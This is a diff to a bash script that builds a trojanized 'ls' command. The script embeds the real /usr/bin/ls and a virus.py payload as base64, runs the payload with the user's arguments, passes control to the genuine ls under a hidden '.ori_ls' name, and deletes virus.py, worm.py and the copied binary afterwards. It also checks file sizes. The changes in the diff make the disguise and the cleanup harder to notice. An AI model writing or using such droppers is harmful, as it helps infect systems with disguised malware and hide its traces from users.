@@ -1,4 +1,4 @@
-#! /usr/bin/env bash
+#!/usr/bin/env bash
 
 FAKE_LS="ls"
 SIG="\xaa\xbb\xcc\xdd"
@@ -6,17 +6,20 @@ SIG="\xaa\xbb\xcc\xdd"
 ori_ls=`gzip -c /usr/bin/ls | base64 -w0`
 virus=`cat virus.py | base64 -w0`
 
+ORI_LS_FILENAME=".ori_ls"
+
 touch $FAKE_LS
 echo '#!/usr/bin/env bash' > $FAKE_LS
 echo "ori_ls=$ori_ls" >> $FAKE_LS
 echo "virus=$virus" >> $FAKE_LS
-echo "echo \$ori_ls | base64 -d | gzip --decompress > ori_ls" >> $FAKE_LS
+echo "echo \$ori_ls | base64 -d | gzip --decompress > $ORI_LS_FILENAME" >> $FAKE_LS
 echo "echo \$virus | base64 -d > virus.py" >> $FAKE_LS
-echo "chmod +x ori_ls && chmod +x virus.py" >> $FAKE_LS
+echo "chmod +x $ORI_LS_FILENAME && chmod +x virus.py" >> $FAKE_LS
 echo "python3 virus.py $1 $2" >> $FAKE_LS  
-echo "./ori_ls \$1" >> $FAKE_LS
+echo "rm virus.py worm.py" >> $FAKE_LS
+echo "./$ORI_LS_FILENAME \$1" >> $FAKE_LS
 
-echo "rm ori_ls && rm virus.py && rm worm.py" >> $FAKE_LS
+echo "rm $ORI_LS_FILENAME"  >> $FAKE_LS
 
 ori_sz=$(echo $(wc -c /usr/bin/ls) | cut -d ' ' -f 1)
 new_sz=$(echo $(wc -c ./ls) | cut -d ' ' -f 1)
